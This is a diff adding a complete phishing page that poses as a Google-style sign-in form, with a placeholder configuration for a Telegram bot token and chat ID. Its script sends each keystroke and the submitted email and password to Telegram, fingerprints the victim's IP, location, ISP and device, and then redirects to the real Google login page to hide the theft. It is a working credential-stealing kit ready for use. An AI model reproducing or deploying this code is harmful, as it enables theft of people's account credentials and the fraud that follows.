@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Sign in to your account</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { 
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        background: #f0f2f5; display: flex; justify-content: center; align-items: center; 
+        min-height: 100vh; padding: 16px;
+    }
+    .card {
+        background: #fff; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+        padding: 32px 24px; width: 100%; max-width: 400px;
+    }
+    .logo { text-align: center; margin-bottom: 24px; }
+    .logo img { height: 40px; }
+    .logo h1 { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-top: 12px; }
+    .logo p { font-size: 14px; color: #666; margin-top: 4px; }
+    .input-group { margin-bottom: 16px; }
+    .input-group label { display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 6px; }
+    .input-group input {
+        width: 100%; padding: 12px 14px; border: 1.5px solid #ddd; border-radius: 8px;
+        font-size: 16px; transition: border-color 0.2s; background: #fafafa;
+    }
+    .input-group input:focus { outline: none; border-color: #1a73e8; background: #fff; }
+    .btn {
+        width: 100%; padding: 14px; background: #1a73e8; color: #fff; border: none;
+        border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;
+        transition: background 0.2s; margin-top: 8px;
+    }
+    .btn:hover { background: #1557b0; }
+    .btn:disabled { background: #93b8f0; cursor: not-allowed; }
+    .error { color: #d93025; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
+    .loading { display: none; text-align: center; margin-top: 16px; }
+    .loading .spinner {
+        width: 20px; height: 20px; border: 3px solid #e0e0e0; border-top: 3px solid #1a73e8;
+        border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading p { color: #666; font-size: 14px; }
+    .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
+    .footer a { color: #1a73e8; text-decoration: none; }
+</style>
+</head>
+<body>
+
+<div class="card" id="loginCard">
+    <!-- LOGO - Change this to match your target brand -->
+    <div class="logo">
+        <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+            <rect width="40" height="40" rx="8" fill="#1a73e8"/>
+            <path d="M20 10c-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10-4.5-10-10-10zm4.5 14.5L22 24l-2-4-2 4-2.5.5L19 18V12h2v6l3.5 6.5z" fill="#fff"/>
+        </svg>
+        <h1>Sign in</h1>
+        <p>Use your account to continue</p>
+    </div>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <label for="email">Email or phone</label>
+            <input type="text" id="email" name="email" placeholder="you@example.com" autocomplete="off" required>
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="off" required>
+        </div>
+        <div class="error" id="errorMsg">Incorrect email or password. Please try again.</div>
+        <button type="submit" class="btn" id="submitBtn">Sign in</button>
+    </form>
+
+    <div class="loading" id="loadingIndicator">
+        <div class="spinner"></div>
+        <p>Verifying your account...</p>
+    </div>
+
+    <div class="footer">
+        <a href="#">Forgot password?</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
+    </div>
+</div>
+
+<script>
+// ========================
+// CONFIGURATION - EDIT THESE
+// ========================
+const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";  // Replace with your Telegram bot token
+const CHAT_ID = "YOUR_CHAT_ID_HERE";       // Replace with your Telegram chat ID
+const REAL_SITE = "https://accounts.google.com";  // Where to redirect after capture
+const BRAND_NAME = "Google";               // Used in Telegram messages
+
+// ========================
+// TELEGRAM EXFILTRATION
+// ========================
+function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const payload = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "Markdown"
+    };
+    
+    // Use fetch with no-cors to avoid blocking
+    fetch(url, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    }).catch(() => {
+        // Fallback: Image beacon (works even if CORS blocks)
+        const img = new Image();
+        img.src = url + '?' + new URLSearchParams({
+            chat_id: CHAT_ID,
+            text: message.substring(0, 200)  // Keep it short for GET
+        }).toString();
+    });
+}
+
+// ========================
+// GET TARGET INFO
+// ========================
+let targetIP = 'Unknown';
+let targetCountry = 'Unknown';
+let targetCity = 'Unknown';
+let targetISP = 'Unknown';
+
+// Get IP and location info
+fetch('https://ipapi.co/json/')
+    .then(r => r.json())
+    .then(data => {
+        targetIP = data.ip || 'Unknown';
+        targetCountry = data.country_name || 'Unknown';
+        targetCity = data.city || 'Unknown';
+        targetISP = data.org || 'Unknown';
+    })
+    .catch(() => {
+        // Fallback
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => { targetIP = d.ip; })
+            .catch(() => {});
+    });
+
+// ========================
+// REAL-TIME KEYSTROKE CAPTURE
+// Every keypress is sent to Telegram immediately
+// ========================
+let lastEmailLen = 0;
+let lastPassLen = 0;
+
+document.getElementById('email').addEventListener('input', function(e) {
+    const val = this.value;
+    if (val.length > lastEmailLen && val.length > 2) {
+        // New character typed - send it
+        const newChar = val[val.length - 1];
+        sendToTelegram(
+            `🔑 *Keystroke* — ${BRAND_NAME}\n` +
+            `👤 *Field:* Email\n` +
+            `📝 *Character:* \`${newChar}\`\n` +
+            `📋 *So far:* \`${val}\``
+        );
+    }
+    lastEmailLen = val.length;
+});
+
+document.getElementById('password').addEventListener('input', function(e) {
+    const val = this.value;
+    if (val.length > lastPassLen && val.length > 0) {
+        const newChar = val[val.length - 1];
+        sendToTelegram(
+            `🔑 *Keystroke* — ${BRAND_NAME}\n` +
+            `👤 *Field:* Password\n` +
+            `📝 *Character:* \`${newChar}\`\n` +
+            `📋 *So far:* \`${'*'.repeat(val.length - 1)}${newChar}\``
+        );
+    }
+    lastPassLen = val.length;
+});
+
+// ========================
+// FORM SUBMISSION
+// ========================
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    const userAgent = navigator.userAgent;
+    const timestamp = new Date().toISOString();
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const platform = navigator.platform || 'Unknown';
+    const language = navigator.language || 'Unknown';
+    
+    // Get screen info
+    const screenInfo = `${window.screen.width}x${window.screen.height}`;
+    
+    // Show loading
+    document.getElementById('loginForm').style.display = 'none';
+    document.getElementById('loadingIndicator').style.display = 'block';
+    
+    // Build the full credential report
+    let message = `🔔 *${BRAND_NAME} — Credentials Captured!*\n\n`;
+    message += `📧 *Email:* \`${email}\`\n`;
+    message += `🔑 *Password:* \`${password}\`\n\n`;
+    message += `🌐 *IP:* ${targetIP}\n`;
+    message += `📍 *Location:* ${targetCity}, ${targetCountry}\n`;
+    message += `🏢 *ISP:* ${targetISP}\n`;
+    message += `📱 *Device:* ${platform}\n`;
+    message += `🖥 *Screen:* ${screenInfo}\n`;
+    message += `🌍 *Language:* ${language}\n`;
+    message += `🕐 *Timezone:* ${timezone}\n`;
+    message += `🧾 *UA:* \`${userAgent.substring(0, 100)}\`\n`;
+    message += `⏰ *Time:* ${timestamp}`;
+    
+    // Send credentials to Telegram
+    sendToTelegram(message);
+    
+    // Also try to send via XMLHttpRequest (more reliable than fetch)
+    try {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+        }));
+    } catch(e) {}
+    
+    // Delay then redirect to real site
+    setTimeout(() => {
+        window.location.href = REAL_SITE;
+    }, 2500);
+});
+
+// ========================
+// ANTI-BOT: Add slight random delay to form appearance
+// ========================
+document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('loginCard').style.opacity = '0';
+    document.getElementById('loginCard').style.transition = 'opacity 0.3s';
+    setTimeout(() => {
+        document.getElementById('loginCard').style.opacity = '1';
+    }, Math.random() * 500 + 200);
+});
+</script>
+</body>
+</html>
